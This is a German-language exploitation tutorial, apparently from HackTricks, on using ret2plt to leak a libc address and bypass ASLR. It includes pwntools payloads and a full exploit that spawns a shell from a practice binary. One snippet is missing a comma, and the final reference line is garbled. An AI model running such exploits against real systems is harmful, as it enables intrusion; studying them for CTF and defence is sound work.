# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Grundinformationen

Das Ziel dieser Technik wäre es, **eine Adresse von einer Funktion aus dem PLT zu leaken**, um ASLR zu umgehen. Das liegt daran, dass, wenn Sie beispielsweise die Adresse der Funktion `puts` aus der libc leaken, Sie dann **berechnen können, wo sich die Basis von `libc` befindet** und Offsets berechnen können, um auf andere Funktionen wie **`system`** zuzugreifen.

Dies kann mit einem `pwntools` Payload wie ([**von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Beachten Sie, wie **`puts`** (unter Verwendung der Adresse aus dem PLT) mit der Adresse von `puts`, die in der GOT (Global Offset Table) gespeichert ist, aufgerufen wird. Dies liegt daran, dass zu dem Zeitpunkt, an dem `puts` den GOT-Eintrag von puts druckt, dieser **Eintrag die genaue Adresse von `puts` im Speicher enthalten wird**.

Beachten Sie auch, wie die Adresse von `main` im Exploit verwendet wird, sodass, wenn `puts` seine Ausführung beendet, die **Binary `main` erneut aufruft, anstatt zu beenden** (damit die geleakte Adresse weiterhin gültig bleibt).

> [!CAUTION]
> Beachten Sie, dass für dieses Vorgehen die **Binary nicht mit PIE kompiliert sein darf** oder Sie müssen **einen Leak gefunden haben, um PIE zu umgehen**, um die Adresse des PLT, GOT und main zu kennen. Andernfalls müssen Sie zuerst PIE umgehen.

Sie finden ein [**vollständiges Beispiel für diesen Bypass hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Dies war der endgültige Exploit aus diesem **Beispiel**:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Weitere Beispiele & Referenzen

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 Bit, ASLR aktiviert, aber kein PIE, der erste Schritt besteht darin, einen Überlauf zu füllen, bis das Byte 0x00 des Canary erreicht ist, um dann puts aufzurufen und es zu leaken. Mit dem Canary wird ein ROP-Gadget erstellt, um puts aufzurufen, um die Adresse von puts aus der GOT zu leaken, und dann ein ROP-Gadget, um `system('/bin/sh')` aufzurufen.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 Bit, ASLR aktiviert, kein Canary, Stack-Überlauf in main von einer Kindfunktion. ROP-Gadget, um puts aufzurufen, um die Adresse von puts aus der GOT zu leaken, und dann ein Gadget, um einen Gadget aufzurufen.

{{#include ../../../banners/hacktricks-training.md}}
